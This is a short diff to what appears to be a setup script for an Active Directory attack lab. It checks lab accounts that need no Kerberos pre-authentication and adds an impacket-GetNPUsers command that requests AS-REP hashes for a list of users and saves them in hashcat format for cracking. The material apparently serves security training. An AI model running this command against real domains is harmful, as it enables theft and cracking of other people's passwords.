@@ -39,3 +39,15 @@ if (-not (Get-ADOrganizationalUnit -LDAPFilter "(ou=PasswordSpray-Lab)" -ErrorAc
 Get-ADUser -Filter 'SamAccountName -like "spray.user*"' `
     -Properties DoesNotRequirePreAuth |
     Select-Object Name, SamAccountName, DoesNotRequirePreAuth
+
+
+impacket-GetNPUsers lab.local/ \
+  -usersfile users.txt \
+  -no-pass \
+  -dc-ip 192.168.39.143 \
+  -request \
+  -format hashcat \
+  -outputfile asrep_hashes.txt
+
+
+
